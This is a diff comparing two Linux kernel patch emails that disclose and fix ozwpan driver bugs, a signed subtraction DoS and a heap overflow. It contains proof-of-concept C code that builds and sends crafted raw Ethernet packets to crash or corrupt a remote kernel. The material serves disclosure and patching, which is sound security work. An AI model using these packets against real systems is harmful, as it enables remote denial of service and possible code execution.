@@ -1,22 +1,27 @@
 From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Subject: [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS
-Date: Wed, 13 May 2015 20:33:34 +0200
-Message-ID: <1431542014-3239-5-git-send-email-Jason@zx2c4.com>
+Subject: [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
+Date: Wed, 13 May 2015 20:33:32 +0200
+Message-ID: <1431542014-3239-3-git-send-email-Jason@zx2c4.com>
 References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
 Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
 To: shigekatsu.tateno@atmel.com, linux-kernel@vger.kernel.org,
 	netdev@vger.kernel.org, oss-security@lists.openwall.com
-Return-path: <linux-kernel-owner@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from frisell.zx2c4.com ([192.95.5.64]:55022 "EHLO frisell.zx2c4.com"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S1754952AbbEMSea (ORCPT <rfc822;netdev@vger.kernel.org>);
+	Wed, 13 May 2015 14:34:30 -0400
 In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-The subtraction here was using a signed integer and did not have any
-bounds checking at all. This commit adds proper bounds checking, made
-easy by use of an unsigned integer. This way, a single packet won't be
-able to remotely trigger a massive loop, locking up the system for a
-considerable amount of time. A PoC follows below, which requires
-ozprotocol.h from this module.
+Using signed integers, the subtraction between required_size and offset
+could wind up being negative, resulting in a memcpy into a heap buffer
+with a negative length, resulting in huge amounts of network-supplied
+data being copied into the heap, which could potentially lead to remote
+code execution.. This is remotely triggerable with a magic packet.
+A PoC which obtains DoS follows below. It requires the ozprotocol.h file
+from this module.
 
 =-=-=-=-=-=
 
@@ -103,9 +108,7 @@ int main(int argc, char *argv[])
 		struct oz_hdr oz_hdr;
 		struct oz_elt oz_elt;
 		struct oz_elt_connect_req oz_elt_connect_req;
-		struct oz_elt oz_elt2;
-		struct oz_multiple_fixed oz_multiple_fixed;
-	} __packed packet = {
+	} __packed connect_packet = {
 		.ether_header = {
 			.ether_type = htons(OZ_ETHERTYPE),
 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
@@ -125,7 +128,7 @@ int main(int argc, char *argv[])
 			.resv1 = {0},
 			.pd_info = 0,
 			.session_id = 0,
-			.presleep = 0,
+			.presleep = 35,
 			.ms_isoc_latency = 0,
 			.host_vendor = 0,
 			.keep_alive = 0,
@@ -134,18 +137,37 @@ int main(int argc, char *argv[])
 			.ms_per_isoc = 0,
 			.up_audio_buf = 0,
 			.ms_per_elt = 0
+		}
+	};
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_get_desc_rsp oz_get_desc_rsp;
+	} __packed pwn_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
 		},
-		.oz_elt2 = {
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(1)
+		},
+		.oz_elt = {
 			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_multiple_fixed) - 3
+			.length = sizeof(struct oz_get_desc_rsp)
 		},
-		.oz_multiple_fixed = {
+		.oz_get_desc_rsp = {
 			.app_id = OZ_APPID_USB,
 			.elt_seq_num = 0,
-			.type = OZ_USB_ENDPOINT_DATA,
-			.endpoint = 0,
-			.format = OZ_DATA_F_MULTIPLE_FIXED,
-			.unit_size = 1,
+			.type = OZ_GET_DESC_RSP,
+			.req_id = 0,
+			.offset = htole16(2),
+			.total_size = htole16(1),
+			.rcode = 0,
 			.data = {0}
 		}
 	};
@@ -156,7 +178,12 @@ int main(int argc, char *argv[])
 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
 	};
 
-	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	usleep(300000);
+	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
 		perror("sendto");
 		return 1;
 	}
@@ -165,27 +192,50 @@ int main(int argc, char *argv[])
 
 Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
 ---
- drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
+ drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
+ drivers/staging/ozwpan/ozusbif.h | 4 ++--
+ 2 files changed, 6 insertions(+), 6 deletions(-)
 
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index 2e67956..934a571 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -326,11 +326,13 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
- 			struct oz_multiple_fixed *body =
- 				(struct oz_multiple_fixed *)data_hdr;
- 			u8 *data = body->data;
--			int n;
-+			unsigned int n;
- 			if (!body->unit_size)
- 				break;
- 			n = (len - sizeof(struct oz_multiple_fixed)+1)
- 				/ body->unit_size;
-+			if (n > len / body->unit_size)
-+				break;
- 			while (n--) {
- 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
- 					data, body->unit_size);
+diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
+index 5ff4716..784b5ec 100644
+--- a/drivers/staging/ozwpan/ozhcd.c
++++ b/drivers/staging/ozwpan/ozhcd.c
+@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
+ /*
+  * Context: softirq
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+-			int length, int offset, int total_size)
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
++			u8 length, u16 offset, u16 total_size)
+ {
+ 	struct oz_port *port = hport;
+ 	struct urb *urb;
+@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+ 	if (!urb)
+ 		return;
+ 	if (status == 0) {
+-		int copy_len;
+-		int required_size = urb->transfer_buffer_length;
++		unsigned int copy_len;
++		unsigned int required_size = urb->transfer_buffer_length;
+ 
+ 		if (required_size > total_size)
+ 			required_size = total_size;
+diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
+index 4249fa3..d2a6085 100644
+--- a/drivers/staging/ozwpan/ozusbif.h
++++ b/drivers/staging/ozwpan/ozusbif.h
+@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
+ 
+ /* Confirmation functions.
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
+-	const u8 *desc, int length, int offset, int total_size);
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
++	const u8 *desc, u8 length, u16 offset, u16 total_size);
+ void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
+ 	const u8 *data, int data_len);
+ 
 -- 
 2.3.6
